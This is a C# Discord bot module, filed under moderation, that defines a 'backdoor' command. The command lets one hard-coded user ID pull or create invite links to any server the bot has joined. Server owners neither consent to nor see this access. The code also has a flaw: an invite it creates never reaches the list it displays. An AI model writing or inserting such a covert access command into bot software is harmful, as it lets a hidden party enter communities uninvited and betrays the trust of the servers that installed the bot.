using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.Linq;

using Discord;
using Discord.Commands;
using Discord.WebSocket;

namespace MCBot.Core.Moderation
{
    public class Backdoor : ModuleBase<SocketCommandContext>
    {
        [Command("backdoor"), Summary("Get the invite of a server")]
        public async Task BackdoorModule(ulong GuildID)
        {
            if (!(Context.User.Id == 109060566210859008))
            {
                await Context.Channel.SendMessageAsync(":x: You are not a bot moderator");
                return;
            }

            if (Context.Client.Guilds.Where(x => x.Id == GuildID).Count() < 1)
            {
                await Context.Channel.SendMessageAsync(":x: I am not in a guild with ID = " + GuildID);
                return;
            }

            SocketGuild Guild = Context.Client.Guilds.Where(x => x.Id == GuildID).FirstOrDefault();

            var Invites = await Guild.GetInvitesAsync();
            if (Invites.Count() < 1)
            {
                try
                {
                    await Guild.TextChannels.First().CreateInviteAsync();
                }
                catch (Exception ex)
                {
                    await Context.Channel.SendMessageAsync($":x: Creating an invite for guild {Guild.Name} went wrong with the error ``{ex.Message}``");
                    return;
                }
            }
            EmbedBuilder Embed = new EmbedBuilder();
            Embed.WithAuthor($"Invites for channel {Guild.Name}:", Guild.IconUrl);
            Embed.WithColor(Color.Green);
            foreach (var Current in Invites)
            {
                Embed.AddField("Invite: ", $"[{Current.ChannelName}]({Current.Url})");
            }

            await Context.Channel.SendMessageAsync("", false, Embed.Build());
        }
    }
}
